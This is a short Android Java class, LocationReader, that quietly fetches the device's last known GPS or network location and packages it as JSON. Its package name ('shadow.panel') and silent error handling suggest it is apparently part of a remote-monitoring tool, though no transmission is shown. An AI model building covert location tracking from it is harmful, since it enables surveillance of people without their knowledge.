package com.shadow.panel;
import android.annotation.SuppressLint;
import android.content.Context;
import android.location.Location;
import android.location.LocationManager;
import org.json.JSONObject;
public class LocationReader {
    @SuppressLint("MissingPermission")
    public static JSONObject current(Context ctx) {
        JSONObject o = new JSONObject();
        try {
            LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc != null) {
                o.put("lat", loc.getLatitude());
                o.put("lon", loc.getLongitude());
                o.put("acc", loc.getAccuracy());
                o.put("time", loc.getTime());
            }
        } catch (Exception ignored) {}
        return o;
    }
}
